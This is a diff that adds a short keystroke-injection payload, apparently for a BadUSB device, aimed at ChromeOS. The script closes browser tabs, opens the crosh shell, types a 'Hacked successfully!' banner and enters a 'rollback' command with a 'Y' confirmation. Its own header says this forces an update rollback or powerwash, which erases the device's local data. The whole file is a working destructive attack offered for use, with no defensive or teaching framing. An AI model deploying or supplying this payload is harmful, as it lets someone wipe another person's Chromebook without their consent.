@@ -1,0 +1,29 @@
+REM MADE BY HTTPS / https://github.com/httpsisbetter
+REM Will commit a update rollback/powerwash
+REM Might not work with enterprise enrolled devices
+REM Requirement: CHROMEOS
+DEFAULTDELAY 100
+CTRL W
+REPEAT 2
+DELAY 2000
+TAB
+TAB
+TAB 
+ENTER
+DELAY 1000
+STRING chrome-untrusted://crosh
+ENTER
+DELAY 3000
+STRING Hacked successfully!
+ENTER
+DELAY 2000
+STRING cat > /dev/null << EOF
+ENTER
+DELAY 500
+STRING rollback
+DELAY 1000 
+ENTER
+DELAY 1000
+STRING Y
+DELAY 500 
+ENTER
